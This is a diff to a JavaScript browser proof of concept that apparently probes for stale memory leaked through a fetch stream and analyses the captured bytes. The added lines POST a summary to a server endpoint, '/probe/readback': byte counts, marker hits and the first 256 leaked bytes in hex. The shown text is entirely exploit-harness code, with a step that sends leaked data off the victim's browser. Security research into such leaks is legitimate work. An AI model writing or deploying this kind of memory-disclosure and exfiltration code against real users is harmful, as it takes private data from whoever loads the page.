@@ -777,6 +777,16 @@ async function run() {
         log('[-] Fetch failed: ' + e.name + ': ' + e.message, 'err');
     }
 
+    // POST stream capture summary
+    fetch(S + '/probe/readback', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            session: sid, slot: -2, source: 'stale-stream-capture',
+            total_bytes: staleTotal, chunks: staleChunks.length
+        })
+    });
+
     // Analyze captured stale data
     if (staleTotal > 0) {
         log('\\n--- Stale data analysis (' + staleTotal + ' bytes) ---', 'info');
@@ -857,6 +867,22 @@ async function run() {
                     log('  0x' + parseInt(m).toString(16) + ': ' + markerHits[m] + ' occurrences');
                 }
             }
+            // POST summary back to server for logging
+            fetch(S + '/probe/readback', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    session: sid, slot: -1, source: 'stale-stream',
+                    total_bytes: staleTotal, chunks: staleChunks.length,
+                    non_zero_in_4k: nonZero, unique_bytes: uniqueBytes.size,
+                    marker_count: markers.length,
+                    markers: Object.fromEntries(markers.map(m => [
+                        '0x' + parseInt(m).toString(16), markerHits[m]
+                    ])),
+                    hex: Array.from(merged.slice(0, 256)).map(
+                        b => b.toString(16).padStart(2,'0')).join('')
+                })
+            });
         }
     }
 
